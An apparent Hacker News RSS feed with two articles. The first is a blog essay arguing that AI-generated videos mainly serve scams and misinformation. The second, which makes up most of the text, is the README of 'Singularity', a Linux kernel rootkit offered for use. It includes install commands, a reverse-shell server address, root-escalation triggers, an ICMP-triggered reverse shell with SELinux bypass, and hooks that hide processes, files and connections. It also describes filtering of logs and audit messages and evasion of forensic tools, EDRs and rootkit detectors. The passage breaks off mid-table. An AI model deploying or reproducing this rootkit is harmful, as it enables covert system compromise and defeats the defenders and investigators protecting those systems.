<?xml version='1.0' encoding='UTF-8'?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><id>hnrss.org/frontpage</id><title>Hacker News: Front Page</title><updated>2026-01-05T19:37:49.166461+00:00</updated><link href="https://news.ycombinator.com/" rel="alternate"/><link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator><subtitle>Hacker News RSS</subtitle><entry><id>https://news.ycombinator.com/item?id=46498651</id><title>All AI Videos Are Harmful (2025)</title><updated>2026-01-05T19:37:54.492853+00:00</updated><content>&lt;doc fingerprint="2142197480d0ee41"&gt;
  &lt;main&gt;
    &lt;p&gt;When OpenAI released the first version of Sora, I was excited. For years, I'd had this short story sitting on my hard drive, something I'd written long ago and always dreamed of bringing to life as a short film. The only problem was I didn't have the expertise to shoot a movie, and my Blender 3D skills are rusty for lack of use. But Sora promised something different. I could upload my sketches, input my script, and generate the film in my mind. The creative barrier had finally been lifted.&lt;/p&gt;
    &lt;p&gt;But reality was a bit different from the demos. No matter what I tried, my outputs never looked anything like what OpenAI showcased. The scenes were adjacent to what I wanted, not what I actually needed.&lt;/p&gt;
    &lt;p&gt;It wasn't just Sora. I tested Runway ML, experimented with Veo, and tried to keep my spending reasonable. Every model generated the same kind of thing: something that "looked good" in a superficial way. They excelled at creating cliché scenes, the kind of generic image that checks all the technical boxes. But creating something that could fit into a coherent narrative, something with intention and specificity? That was nearly impossible.&lt;/p&gt;
    &lt;p&gt;When Sora 2 launched, I started right where I left off. Maybe this time would be different. The videos are more realistic than ever, but the main problem remains unchanged. These tools aren't struggling because they can't generate scenes or dialogue, they sure can. The issue is that they generate what I've come to call "AI Videos," and that's a distinct category with its own aesthetic fingerprint.&lt;/p&gt;
    &lt;head rend="h2"&gt;The New Uncanny Valley&lt;/head&gt;
    &lt;p&gt;Think about how you instantly recognize certain types of content. If I described a video to you right now: fast-paced, someone talking directly to a screen with multiple jump cuts, a ring light's circular reflection visible in their eyes, their bedroom visible in the background. You would instantly say "TikTok video." The format is hard to miss these days.&lt;/p&gt;
    &lt;p&gt;AI-generated videos have developed their own unique look. There's a visual quality that marks them, a subtle wrongness that your brain picks up on even when you can't articulate exactly what's off. It's the new uncanny valley, and I feel an intense revulsion whenever I encounter it. I'm not alone in this reaction either. In my small circle of friends and colleagues, we've all developed the same instinctive aversion.&lt;/p&gt;
    &lt;p&gt;I'm starting to feel the same revulsion for YouTube shorts even when they are created by real people. The reason is, well, YouTube has been secretly using AI to alter real videos, making authentic content start to look artificially generated. You will notice people's faces look smoothed or sharpened, and that happens without the creator's knowledge or consent. The line between real and AI-generated content is blurring from both directions.&lt;/p&gt;
    &lt;p&gt;So if these videos trigger such a negative response in many viewers, where can AI-generated content actually thrive? The answer: with spammers, scammers, rage-baiters, and manipulators.&lt;/p&gt;
    &lt;p&gt;These bad actors are having a field day with AI video tools. A couple months ago, I wrote about AI Video Overviews, I speculated that Google might eventually start using AI-generated videos as enhanced search results, synthesizing information from multiple sources into custom video summaries. That remains speculative. But for harmful content? That's not speculation, it's happening right now, at scale.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Primary Victims&lt;/head&gt;
    &lt;p&gt;The main targets are older adults. My parents and their peer group are constantly sharing AI-generated videos in their group chats and on social media. Even as I write this, my mother just sent me a video showing Denzel Washington giving life advice, entirely fabricated, of course.&lt;/p&gt;
    &lt;p&gt;There is a wide variety of content. Health misinformation, sensational fake news, videos claiming Obama has embraced Islam, an elderly Tai Chi master giving dubious health tips, Trump supposedly reversing or doubling down on positions he never actually took. The specific claims change daily, but the pattern remains constant.&lt;/p&gt;
    &lt;p&gt;These videos spread like wildfire despite our collective, repeated efforts to educate people. I've spent countless hours explaining why these videos are fake. In my community group chat, I've explained the telltale signs multiple times, like the little cloud icon with eyes that appears on AI-generated content (sora watermark). I've shared practical tips: if a video seems too good or too shocking to be true, search for the information on Google to verify it. Nothing seems to stick.&lt;/p&gt;
    &lt;p&gt;Some days, according to these videos, we're at war. Other days, entire cities have burned down, or a tsunami has devastated Los Angeles. You can't debunk faster than this information spreads.&lt;/p&gt;
    &lt;p&gt;When you find these videos on YouTube, scroll down to the comments. You'll see real people engaging seriously with fabricated content, offering heartfelt responses to synthetic personas, debating points that were never actually made by the people shown in the videos. I get phone calls from family overseas, people reach out, or share what they think is happening right at my doorstep. When I ask where they heard it? They forward a whatsapp video.&lt;/p&gt;
    &lt;p&gt;There's no easy solution to this crisis.&lt;/p&gt;
    &lt;p&gt;AI video technology has found its audience, just not the audience the marketing materials promised. These tools weren't really designed to help people like me overcome technical limitations and bring our stories to life. They were made to enable those who want to manipulate, deceive, and exploit people for engagement, profit, or ideology.&lt;/p&gt;
    &lt;p&gt;I've tried to find legitimate, beneficial use cases for AI video generation. I've thought about educational applications, accessibility features, and experimental art projects. Maybe they exist in theory, but in practice, I keep coming back to the same conclusion.&lt;/p&gt;
    &lt;p&gt;Right now, every AI video I encounter is harmful. Every single one, without exception.&lt;/p&gt;
    &lt;p&gt;Either it's directly harmful like spreading misinformation, impersonating real people, manipulating vulnerable viewers. Or it's indirectly harmful by training us to accept a synthetic reality where nothing can be trusted and everything must be questioned. Even the "harmless" AI videos contribute to a broader erosion of trust in visual media.&lt;/p&gt;
    &lt;p&gt;This technology is devastatingly effective for the purposes bad actors have found for it. The creative barrier I hoped to overcome remains in place. But now there's a new barrier too. The barrier of trust. And that one might be much harder to rebuild.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://idiallo.com/blog/all-ai-videos-are-harmful"/><published>2026-01-05T13:44:59+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46498658</id><title>Singularity Rootkit: SELinux bypass and netlink filter (ss/conntrack hidden)</title><updated>2026-01-05T19:37:53.943783+00:00</updated><content>&lt;doc fingerprint="711b4b4d6da0fd14"&gt;
  &lt;main&gt;
    &lt;quote&gt;
      &lt;p&gt;"Shall we give forensics a little work?"&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Singularity is a powerful Linux Kernel Module (LKM) rootkit designed for modern 6.x kernels. It provides comprehensive stealth capabilities through advanced system call hooking via ftrace infrastructure.&lt;/p&gt;
    &lt;p&gt;Full Research Article (outdated version): Singularity: A Final Boss Linux Kernel Rootkit&lt;/p&gt;
    &lt;p&gt;EDR Evasion Case Study: Bypassing Elastic EDR with Singularity&lt;/p&gt;
    &lt;p&gt;Singularity is a sophisticated rootkit that operates at the kernel level, providing:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Process Hiding: Make any process completely invisible to the system&lt;/item&gt;
      &lt;item&gt;File &amp;amp; Directory Hiding: Conceal files using pattern matching&lt;/item&gt;
      &lt;item&gt;Network Stealth: Hide TCP/UDP connections, ports, and conntrack entries&lt;/item&gt;
      &lt;item&gt;Privilege Escalation: Multiple methods to gain instant root access&lt;/item&gt;
      &lt;item&gt;Log Sanitization: Filter kernel logs and system journals in real-time&lt;/item&gt;
      &lt;item&gt;Self-Hiding: Remove itself from module lists and system monitoring&lt;/item&gt;
      &lt;item&gt;Remote Access: ICMP-triggered reverse shell with automatic hiding&lt;/item&gt;
      &lt;item&gt;Anti-Detection: Block eBPF tools, io_uring operations, and prevent module loading&lt;/item&gt;
      &lt;item&gt;Audit Evasion: Drop audit messages for hidden processes at netlink level with statistics tracking&lt;/item&gt;
      &lt;item&gt;Memory Forensics Evasion: Filter /proc/kcore, /proc/kallsyms, /proc/vmallocinfo&lt;/item&gt;
      &lt;item&gt;Cgroup Filtering: Filter hidden PIDs from cgroup.procs&lt;/item&gt;
      &lt;item&gt;Syslog Evasion: Hook do_syslog to filter klogctl() kernel ring buffer access&lt;/item&gt;
      &lt;item&gt;Debugfs Evasion: Filter output of tools that read raw block devices&lt;/item&gt;
      &lt;item&gt;Conntrack Filtering: Hide connections from /proc/net/nf_conntrack and netlink SOCK_DIAG/NETFILTER queries&lt;/item&gt;
      &lt;item&gt;SELinux Evasion: Automatic SELinux enforcing mode bypass on ICMP trigger&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Environment-triggered privilege elevation via signals and environment variables&lt;/item&gt;
      &lt;item&gt;Complete process hiding from /proc and monitoring tools&lt;/item&gt;
      &lt;item&gt;Pattern-based filesystem hiding for files and directories&lt;/item&gt;
      &lt;item&gt;Network connection concealment from netstat, ss, conntrack, and packet analyzers&lt;/item&gt;
      &lt;item&gt;Advanced netlink filtering (SOCK_DIAG, NETFILTER/conntrack messages)&lt;/item&gt;
      &lt;item&gt;Real-time kernel log filtering for dmesg, journalctl, and klogctl&lt;/item&gt;
      &lt;item&gt;Module self-hiding from lsmod and /sys/module&lt;/item&gt;
      &lt;item&gt;Automatic kernel taint flag normalization&lt;/item&gt;
      &lt;item&gt;BPF syscall interception to prevent eBPF-based detection&lt;/item&gt;
      &lt;item&gt;io_uring protection against asynchronous I/O bypass&lt;/item&gt;
      &lt;item&gt;Prevention of new kernel module loading&lt;/item&gt;
      &lt;item&gt;Log masking for kernel messages and system logs&lt;/item&gt;
      &lt;item&gt;Evasion of standard rootkit detectors (unhide, chkrootkit, rkhunter)&lt;/item&gt;
      &lt;item&gt;Automatic child process tracking and hiding via tracepoint hooks&lt;/item&gt;
      &lt;item&gt;Multi-architecture support (x64 + ia32)&lt;/item&gt;
      &lt;item&gt;Network packet-level filtering with raw socket protection&lt;/item&gt;
      &lt;item&gt;Protection against all file I/O variants (read, write, splice, sendfile, tee, copy_file_range)&lt;/item&gt;
      &lt;item&gt;Netlink-level audit message filtering with statistics tracking to evade auditd detection&lt;/item&gt;
      &lt;item&gt;Cgroup PID filtering to prevent detection via &lt;code&gt;/sys/fs/cgroup/*/cgroup.procs&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;TaskStats netlink blocking to prevent PID enumeration&lt;/item&gt;
      &lt;item&gt;/proc/kcore filtering to evade memory forensics tools (Volatility, crash, gdb)&lt;/item&gt;
      &lt;item&gt;do_syslog hook to filter klogctl() and prevent kernel ring buffer leaks&lt;/item&gt;
      &lt;item&gt;Block device output filtering to evade debugfs and similar disk forensics tools&lt;/item&gt;
      &lt;item&gt;journalctl -k output filtering via write hook&lt;/item&gt;
      &lt;item&gt;SELinux enforcing mode bypass capability for ICMP-triggered shells&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Linux kernel 6.x (tested on 6.8.0-79-generic, 6.17.8-300.fc43.x86_64 and 6.12)&lt;/item&gt;
      &lt;item&gt;Kernel headers for your running kernel&lt;/item&gt;
      &lt;item&gt;GCC and Make&lt;/item&gt;
      &lt;item&gt;Root access&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;cd /dev/shm
git clone https://github.com/MatheuZSecurity/Singularity
cd Singularity
sudo bash setup.sh
sudo bash scripts/x.sh
cd ..&lt;/code&gt;
    &lt;p&gt;That's it. The module automatically:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Hides itself from lsmod, /proc/modules, /sys/module&lt;/item&gt;
      &lt;item&gt;Clears kernel taint flags&lt;/item&gt;
      &lt;item&gt;Filters sensitive strings from dmesg, journalctl -k, klogctl&lt;/item&gt;
      &lt;item&gt;Starts protecting your hidden files and processes&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The module automatically hides itself after loading&lt;/p&gt;
    &lt;p&gt;There is no unload feature - reboot required to remove&lt;/p&gt;
    &lt;p&gt;Test in a VM first - cannot be removed without restarting&lt;/p&gt;
    &lt;p&gt;Edit &lt;code&gt;include/core.h&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;#define YOUR_SRV_IP "192.168.1.100"  // Change this
#define YOUR_SRV_IPv6 { .s6_addr = { [15] = 1 } }  // IPv6 if needed&lt;/code&gt;
    &lt;p&gt;Edit &lt;code&gt;modules/icmp.c&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;#define SRV_PORT "8081"&lt;/code&gt;
    &lt;code&gt;# Hide current shell
kill -59 $$

# Hide specific process
kill -59 &amp;lt;PID&amp;gt;&lt;/code&gt;
    &lt;p&gt;Process will be invisible to ps, top, htop, /proc, and all monitoring tools. All child processes are automatically tracked and hidden.&lt;/p&gt;
    &lt;p&gt;Files matching your configured patterns are automatically hidden:&lt;/p&gt;
    &lt;code&gt;mkdir singularity
echo "secret" &amp;gt; singularity/data.txt

# Invisible to ls, find, locate
ls -la | grep singularity
# (no output)

# But you can still access it
cat singularity/data.txt
# secret

# cd is blocked for security
cd singularity
# bash: cd: singularity: No such file or directory&lt;/code&gt;
    &lt;p&gt;Method 1: Environment Variable&lt;/p&gt;
    &lt;code&gt;MAGIC=mtz bash
id  # uid=0(root)&lt;/code&gt;
    &lt;p&gt;Method 2: Signal&lt;/p&gt;
    &lt;code&gt;kill -59 $$
id  # uid=0(root)&lt;/code&gt;
    &lt;p&gt;Connections on your configured port are automatically hidden:&lt;/p&gt;
    &lt;code&gt;nc -lvnp 8081

# Invisible to all monitoring
ss -tulpn | grep 8081        # (no output)
netstat -tulpn | grep 8081   # (no output)
lsof -i :8081                # (no output)
cat /proc/net/nf_conntrack | grep 8081  # (no output)

# Even advanced netlink queries are filtered
ss -tapen | grep 8081        # (no output)
conntrack -L | grep 8081     # (no output)&lt;/code&gt;
    &lt;p&gt;Packets are dropped at raw socket level (tpacket_rcv) and hidden from:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;/proc/net/* interfaces (tcp, tcp6, udp, udp6)&lt;/item&gt;
      &lt;item&gt;/proc/net/nf_conntrack&lt;/item&gt;
      &lt;item&gt;Netlink SOCK_DIAG queries (used by ss, lsof)&lt;/item&gt;
      &lt;item&gt;Netlink NETFILTER/conntrack messages (used by conntrack tool)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Trigger a hidden reverse shell remotely with automatic SELinux bypass:&lt;/p&gt;
    &lt;p&gt;1. Start listener:&lt;/p&gt;
    &lt;code&gt;nc -lvnp 8081&lt;/code&gt;
    &lt;p&gt;2. Send ICMP trigger:&lt;/p&gt;
    &lt;code&gt;sudo python3 scripts/trigger.py &amp;lt;target_ip&amp;gt;&lt;/code&gt;
    &lt;p&gt;3. Receive root shell (automatically hidden with all child processes, SELinux enforcing mode bypassed if active)&lt;/p&gt;
    &lt;p&gt;All attempts to disable ftrace are silently intercepted and blocked:&lt;/p&gt;
    &lt;code&gt;echo 0 &amp;gt; /proc/sys/kernel/ftrace_enabled       # Appears successful but does nothing&lt;/code&gt;
    &lt;p&gt;Protected syscalls: write, writev, pwrite64, pwritev, pwritev2, sendfile, sendfile64, splice, vmsplice, tee, copy_file_range, io_uring_enter (with intelligent per-PID caching)&lt;/p&gt;
    &lt;p&gt;eBPF operations are intercepted and blocked:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;BPF_PROG_LOAD (tracepoint, kprobe, tracing, LSM, ext types)&lt;/item&gt;
      &lt;item&gt;BPF_ITER_CREATE, BPF_PROG_GET_NEXT_ID, BPF_MAP_GET_NEXT_ID&lt;/item&gt;
      &lt;item&gt;BPF_RAW_TRACEPOINT_OPEN, BPF_LINK_CREATE&lt;/item&gt;
      &lt;item&gt;BPF_PROG_QUERY, BPF_OBJ_GET_INFO_BY_FD&lt;/item&gt;
      &lt;item&gt;All BPF operations from hidden PIDs&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Protection against io_uring bypass in ftrace_enabled and tracing_on attempts with intelligent caching (1 second cache per PID to prevent repeated process scanning and reduce overhead)&lt;/p&gt;
    &lt;p&gt;Real-time filtering of sensitive strings from all kernel log interfaces:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Interface&lt;/cell&gt;
        &lt;cell role="head"&gt;Hook&lt;/cell&gt;
        &lt;cell role="head"&gt;Status&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;
          &lt;code&gt;dmesg&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;read hook on /proc/kmsg&lt;/cell&gt;
        &lt;cell&gt;✅ Filtered&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;
          &lt;code&gt;journalctl -k&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;write hook (output filtering)&lt;/cell&gt;
        &lt;cell&gt;✅ Filtered&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;&lt;code&gt;klogctl()&lt;/code&gt; / &lt;code&gt;syslog()&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;do_syslog hook&lt;/cell&gt;
        &lt;cell&gt;✅ Filtered&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;
          &lt;code&gt;/sys/kernel/debug/tracing/*&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;read hook&lt;/cell&gt;
        &lt;cell&gt;✅ Filtered&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;&lt;code&gt;/var/log/kern.log&lt;/code&gt;, &lt;code&gt;syslog&lt;/code&gt;, &lt;code&gt;auth.log&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;read hook&lt;/cell&gt;
        &lt;cell&gt;✅ Filtered&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;&lt;code&gt;/proc/kallsyms&lt;/code&gt;, &lt;code&gt;/proc/kcore&lt;/code&gt;, &lt;code&gt;/proc/vmallocinfo&lt;/code&gt;&lt;/cell&gt;
        &lt;cell&gt;read hook&lt;/cell&gt;
        &lt;cell&gt;✅ Filtered&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;/proc/net/nf_conntrack&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;read hook&lt;/cell&gt;
        &lt;cell&gt;✅ Filtered&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Filtered keywords: taint, journal, singularity, Singularity, matheuz, zer0t, kallsyms_lookup_name, obliviate, hook, hooked_, constprop, clear_taint, ftrace_helper, fh_install, fh_remove&lt;/p&gt;
    &lt;p&gt;Note: Audit messages for hidden PIDs are dropped at netlink level with statistics tracking (get_blocked_audit_count, get_total_audit_count)&lt;/p&gt;
    &lt;p&gt;Singularity hooks the write syscall to detect and filter output from disk forensics tools:&lt;/p&gt;
    &lt;p&gt;How it works:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Detects if process has a block device open (&lt;code&gt;/dev/sda&lt;/code&gt;,&lt;code&gt;/dev/nvme0n1&lt;/code&gt;, etc)&lt;/item&gt;
      &lt;item&gt;Detects debugfs-style output patterns (inode listings, filesystem metadata)&lt;/item&gt;
      &lt;item&gt;Sanitizes hidden patterns in-place (replaces with spaces to maintain buffer size/checksums)&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;# Hidden files are invisible even to raw disk analysis
debugfs /dev/sda3 -R 'ls -l /home/user/singularity'
#            (spaces where "singularity" was)

# The pattern is sanitized in the output buffer
# Checksums remain valid, no corruption&lt;/code&gt;
    &lt;p&gt;Detected patterns:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;debugfs:&lt;/code&gt;prefix&lt;/item&gt;
      &lt;item&gt;Inode listings with parentheses&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;Inode count:&lt;/code&gt;,&lt;code&gt;Block count:&lt;/code&gt;,&lt;code&gt;Filesystem volume name:&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;Filesystem UUID:&lt;/code&gt;,&lt;code&gt;e2fsck&lt;/code&gt;,&lt;code&gt;Inode:&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Complete hiding from syscalls and kernel interfaces:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;/proc/[pid]/* (openat, readlinkat blocked)&lt;/item&gt;
      &lt;item&gt;getdents, getdents64 (directory listing filtered)&lt;/item&gt;
      &lt;item&gt;stat, lstat, statx, newfstatat (metadata hidden)&lt;/item&gt;
      &lt;item&gt;kill with signal 0 (returns ESRCH)&lt;/item&gt;
      &lt;item&gt;getsid, getpgid, getpgrp (returns ESRCH)&lt;/item&gt;
      &lt;item&gt;sched_getaffinity, sched_getparam, sched_getscheduler, sched_rr_get_interval (returns ESRCH)&lt;/item&gt;
      &lt;item&gt;getpriority (returns ESRCH)&lt;/item&gt;
      &lt;item&gt;sysinfo (process count adjusted)&lt;/item&gt;
      &lt;item&gt;pidfd_open (returns ESRCH)&lt;/item&gt;
      &lt;item&gt;TaskStats netlink queries (returns ESRCH)&lt;/item&gt;
      &lt;item&gt;Cgroup PIDs filtered from cgroup.procs&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Child processes automatically tracked via sched_process_fork tracepoint hook.&lt;/p&gt;
    &lt;p&gt;Process Monitoring: ps, top, htop, etc&lt;/p&gt;
    &lt;p&gt;Filesystem: ls, find, locate, stat, lstat, readlink&lt;/p&gt;
    &lt;p&gt;Disk Forensics: debugfs, e2fsck (output filtered via write hook)&lt;/p&gt;
    &lt;p&gt;Memory Forensics: Volatility, crash, gdb (via /proc/kcore filtering)&lt;/p&gt;
    &lt;p&gt;Network: netstat, ss, lsof, tcpdump, wireshark, conntrack, /proc/net/*&lt;/p&gt;
    &lt;p&gt;Logs &amp;amp; Traces: dmesg, journalctl -k, klogctl, strace, ltrace, ftrace, perf, bpftrace, bpftool, libbpf&lt;/p&gt;
    &lt;p&gt;Rootkit Detectors: unhide, chkrootkit, rkhunter&lt;/p&gt;
    &lt;p&gt;Module Detection: lsmod, modinfo, /sys/module, /proc/modules, kmod&lt;/p&gt;
    &lt;p&gt;Modern Detection: eBPF-based security tools (Tracee), io_uring-based monitors, and some Linux EDRs&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Syscall/Function&lt;/cell&gt;
        &lt;cell role="head"&gt;Module&lt;/cell&gt;
        &lt;cell role="head"&gt;Purpose&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;getdents, getdents64&lt;/cell&gt;
        &lt;cell&gt;hiding_directory.c&lt;/cell&gt;
        &lt;cell&gt;Filter directory entries, hide PIDs&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;stat, lstat, newstat, newlstat, statx, newfstatat&lt;/cell&gt;
        &lt;cell&gt;hiding_stat.c&lt;/cell&gt;
        &lt;cell&gt;Hide file metadata, adjust nlink&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;getpriority&lt;/cell&gt;
        &lt;cell&gt;hiding_stat.c&lt;/cell&gt;
        &lt;cell&gt;Hide priority queries for hidden PIDs&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;openat&lt;/cell&gt;
        &lt;cell&gt;open.c&lt;/cell&gt;
        &lt;cell&gt;Block access to hidden /proc/[pid]&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;readlinkat&lt;/cell&gt;
        &lt;cell&gt;hiding_readlink.c&lt;/cell&gt;
        &lt;cell&gt;Block symlink resolution&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;chdir&lt;/cell&gt;
        &lt;cell&gt;hiding_chdir.c&lt;/cell&gt;
        &lt;cell&gt;Prevent cd into hidden dirs&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;read, pread64, readv, preadv&lt;/cell&gt;
        &lt;cell&gt;clear_taint_dmesg.c&lt;/cell&gt;
        &lt;cell&gt;Filter kernel logs, kcore, kallsyms, cgroup PIDs, nf_conntrack&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;do_syslog&lt;/cell&gt;
        &lt;cell&gt;clear_taint_dmesg.c&lt;/cell&gt;
        &lt;cell&gt;Filter klogctl()/syslog() kernel ring buffer&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;sched_debug_show&lt;/cell&gt;
        &lt;cell&gt;clear_taint_dmesg.c&lt;/cell&gt;
        &lt;cell&gt;Filter scheduler debug output&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;write, writev, pwrite64, pwritev, pwritev2&lt;/cell&gt;
        &lt;cell&gt;hooks_write.c&lt;/cell&gt;
        &lt;cell&gt;Block ftrace control + filter disk forensics + filter journalctl output&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;sendfile, sendfile64, copy_file_range&lt;/cell&gt;
        &lt;cell&gt;hooks_write.c&lt;/cell&gt;
        &lt;cell&gt;Block file copies to protected files&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;splice, vmsplice, tee&lt;/cell&gt;
        &lt;cell&gt;hooks_write.c&lt;/cell&gt;
        &lt;cell&gt;Block pipe-based writes to protected files&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;io_uring_enter&lt;/cell&gt;
        &lt;cell&gt;hooks_write.c&lt;/cell&gt;
        &lt;cell&gt;Block async I/O bypass with PID caching&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;kill, getuid&lt;/cell&gt;
        &lt;cell&gt;become_root.c&lt;/cell&gt;
        &lt;cell&gt;Root trigger + magic env detection&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;getsid, getpgid, getpgrp&lt;/cell&gt;
        &lt;cell&gt;become_root.c&lt;/cell&gt;
        &lt;cell&gt;Returns ESRCH for hidden PIDs&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;sched_getaffinity, sched_getparam, sched_getscheduler, sched_rr_get_interval&lt;/cell&gt;
        &lt;cell&gt;become_root.c&lt;/cell&gt;
        &lt;cell&gt;Returns ESRCH for hidden PIDs&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;sysinfo&lt;/cell&gt;
        &lt;cell&gt;become_root.c&lt;/cell&gt;
        &lt;cell&gt;Adjusts process count&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;pidfd_open&lt;/cell&gt;
        &lt;cell&gt;become_root.c&lt;/cell&gt;
        &lt;cell&gt;Returns ESRCH for hidden PIDs&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;tcp4_seq_show, tcp6_seq_show&lt;/cell&gt;
        &lt;cell&gt;hiding_tcp.c&lt;/cell&gt;
        &lt;cell&gt;Hide TCP connections from /proc/net&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;udp4_seq_show, udp6_seq_show&lt;/cell&gt;
        &lt;cell&gt;hiding_tcp.c&lt;/cell&gt;
        &lt;cell&gt;Hide UDP connections from /proc/net&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;tpacket_rcv&lt;/cell&gt;
        &lt;cell&gt;hiding_tcp.c&lt;/cell&gt;
        &lt;cell&gt;Drop packets at raw socket level&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;recvmsg&lt;/cell&gt;
        &lt;cell&gt;audit.c&lt;/cell&gt;
        &lt;cell&gt;Filter netlink SOCK_DIAG and NETFILTER messages&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;netlink_unicast&lt;/cell&gt;
        &lt;cell&gt;audit.c&lt;/cell&gt;
        &lt;cell&gt;Drop audit messages for hidden PIDs&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;bpf&lt;/cell&gt;
        &lt;cell&gt;bpf_hook.c&lt;/cell&gt;
        &lt;cell&gt;Block eBPF tracing operations&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;init_module, finit_module&lt;/cell&gt;
        &lt;cell&gt;hooking_insmod.c&lt;/cell&gt;
        &lt;cell&gt;Prevent module loading&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;icmp_rcv&lt;/cell&gt;
        &lt;cell&gt;icmp.c&lt;/cell&gt;
        &lt;cell&gt;ICMP-triggered reverse shell with SELinux bypass&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;taskstats_user_cmd&lt;/cell&gt;
        &lt;cell&gt;task.c&lt;/cell&gt;
        &lt;cell&gt;Block TaskStats queries for hidden PIDs&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;sched_process_fork (tracepoint)&lt;/cell&gt;
        &lt;cell&gt;trace.c&lt;/cell&gt;
        &lt;cell&gt;Track child processes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;tainted_mask (kthread)&lt;/cell&gt;
        &lt;cell&gt;reset_tainted.c&lt;/cell&gt;
